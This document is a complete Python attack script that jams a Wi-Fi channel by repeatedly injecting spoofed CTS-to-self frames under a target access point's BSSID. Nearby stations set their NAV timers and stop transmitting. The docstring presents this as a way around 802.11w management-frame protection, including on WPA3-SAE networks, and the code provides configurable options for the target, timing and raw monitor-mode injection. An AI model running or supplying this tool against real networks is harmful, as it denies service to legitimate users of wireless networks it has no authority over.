#!/usr/bin/env python3
"""
NAV (Network Allocation Vector) manipulation via CTS-to-self injection.

Floods the target AP's channel with spoofed CTS-to-self frames
appearing to originate from the target BSSID. All 802.11 stations
that receive these frames set their NAV timer and defer all
transmission for the specified duration.

This prevents clients from sending Probe Requests, Association
Requests, Authentication frames, or ACKs to the legitimate AP.
The channel becomes functionally unusable without a single
deauthentication frame.

802.11w (PMF) does not protect control frames. CTS is processed
at the PHY/MAC layer, below where management frame protection
operates. This works against WPA3-SAE with MFPR=1.

Resource cost: ~33 frames/sec at default settings. Negligible
USB bandwidth relative to mdk4 bulk injection.
"""

import argparse
import socket
import struct
import sys
import time


def mac_to_bytes(mac: str) -> bytes:
    """Convert colon-delimited MAC string to 6-byte value."""
    return bytes.fromhex(mac.replace(":", ""))


def build_radiotap_header() -> bytes:
    """
    Minimal RadioTap header for raw frame injection.
    version=0, pad=0, length=8, present_flags=0
    """
    return struct.pack("<BBHI", 0, 0, 8, 0)


def build_cts_frame(bssid_bytes: bytes, duration_us: int) -> bytes:
    """
    Construct a CTS-to-self frame.

    IEEE 802.11-2020 Section 9.3.1.3:
        Frame Control:  2 bytes  (0x00C4 = Control type, CTS subtype)
        Duration/ID:    2 bytes  (microseconds, max 32767)
        RA:             6 bytes  (receiver address = spoofed BSSID)

    Total: 10 bytes on the wire. Driver appends FCS at transmit.

    All stations receiving this frame set:
        NAV = max(NAV_current, Duration field value)
    and defer channel access until NAV expires.
    """
    fc = struct.pack("<H", 0x00C4)
    dur = struct.pack("<H", min(duration_us, 32767))
    return fc + dur + bssid_bytes


def main():
    parser = argparse.ArgumentParser(
        description="CTS-to-self NAV channel silencing",
    )
    parser.add_argument(
        "--iface",
        required=True,
        help="Monitor-mode interface for injection",
    )
    parser.add_argument(
        "--bssid",
        required=True,
        help="Target BSSID to spoof as CTS source",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=5,
        help="Total run time in seconds",
    )
    parser.add_argument(
        "--nav-us",
        type=int,
        default=30000,
        help="NAV reservation per frame in microseconds (max 32767)",
    )
    parser.add_argument(
        "--interval-ms",
        type=int,
        default=25,
        help="Milliseconds between CTS injections",
    )
    args = parser.parse_args()

    bssid_bytes = mac_to_bytes(args.bssid)
    radiotap = build_radiotap_header()
    cts = build_cts_frame(bssid_bytes, args.nav_us)
    frame = radiotap + cts

    try:
        sock = socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
        )
        sock.bind((args.iface, 0))
    except PermissionError:
        print("[nav] requires root", file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f"[nav] socket bind failed: {e}", file=sys.stderr)
        sys.exit(1)

    interval = args.interval_ms / 1000.0
    end_time = time.time() + args.duration
    frames_sent = 0

    try:
        while time.time() < end_time:
            sock.send(frame)
            frames_sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
        print(
            f"[nav] {frames_sent} CTS-to-self sent "
            f"(NAV={args.nav_us}us interval={args.interval_ms}ms)",
            file=sys.stderr,
        )


if __name__ == "__main__":
    main()
